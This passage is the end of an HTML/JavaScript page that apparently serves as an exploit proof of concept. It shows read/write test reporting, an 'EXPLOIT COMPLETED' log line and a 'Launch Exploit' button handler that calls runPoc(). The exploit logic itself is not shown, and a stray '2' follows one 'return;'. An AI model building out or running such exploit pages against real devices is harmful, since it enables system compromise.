                    updateStatus('rw', `${passedTests}/3`, 'pass');
                } else {
                    log(`✗ R/W: ${passedTests}/3 tests passed`, 'error');
                    updateStatus('rw', `${passedTests}/3`, 'fail');
                }
            } catch (e) {
                log(`R/W test failed: ${e.message}`, 'error');
                updateStatus('rw', 'Error', 'fail');
            }

            log("", 'info');
            log("=== EXPLOIT COMPLETED ===", 'kernel');
        }

        // === EVENT LISTENER ===
        document.addEventListener('DOMContentLoaded', function() {
            const btn = document.getElementById('startButton');
            if (btn) {
                btn.addEventListener('click', async function() {
                    if (gIsRunning) return;2
                    gIsRunning = true;
                    btn.disabled = true;
                    btn.textContent = 'Running...';
                    log("Starting exploit...", 'kernel');
                    try {
                        await runPoc();
                    } catch (e) {
                        log(`FATAL: ${e.message}`, 'error');
                    } finally {
                        btn.disabled = false;
                        btn.textContent = 'Launch Exploit';


						    gIsRunning = false;
                    }
                });
            }
        });
    </script>
</body>
</html>
